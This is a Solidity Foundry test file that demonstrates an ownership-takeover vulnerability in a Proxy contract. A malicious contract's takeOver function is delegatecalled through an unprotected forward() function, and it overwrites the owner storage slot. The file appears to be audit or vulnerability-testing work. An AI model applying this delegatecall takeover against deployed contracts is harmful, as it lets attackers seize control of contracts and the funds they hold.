
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Proxy} from "../src/Proxy.sol";

// Malicious contract that will be used to take over ownership via delegatecall
contract MaliciousOwnerTakeover {
    // Storage slot 0 matches the owner slot in Proxy
    address owner;
    
    function takeOver() external {
        owner = msg.sender;
    }
}

contract TestAccessControlProxy is Test {
    Proxy public _contractUnderTest;
    MaliciousOwnerTakeover public _maliciousContract;
    address public originalOwner;

    function setUp() public {
        originalOwner = address(this);
        _contractUnderTest = new Proxy();
        _maliciousContract = new MaliciousOwnerTakeover();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the original owner (the deployer/test contract)
        vm.assume(caller != originalOwner);

        // --- 2. State Configuration ---
        // No special funding needed as forward is not payable

        // --- 3. Execution & Assertion ---
        
        // Prepare the malicious calldata to take over ownership
        bytes memory maliciousData = abi.encodeWithSelector(MaliciousOwnerTakeover.takeOver.selector);
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the unprotected forward function
        // This will delegatecall to the malicious contract, which will overwrite
        // the owner storage slot with the caller's address
        _contractUnderTest.forward(address(_maliciousContract), maliciousData);

        // Assert that the ownership was successfully taken over
        // Read the owner from storage slot 0
        bytes32 newOwnerSlot = vm.load(address(_contractUnderTest), bytes32(uint256(0)));
        address newOwner = address(uint160(uint256(newOwnerSlot)));
        
        // The caller should now be the owner, proving the vulnerability
        assertEq(newOwner, caller, "Arbitrary user should have taken over ownership");
        assertFalse(newOwner == originalOwner, "Original owner should no longer be the owner");
    }
}

// Simple contract for basic forward test
contract DummyTarget {
    function doNothing() external pure {}
}
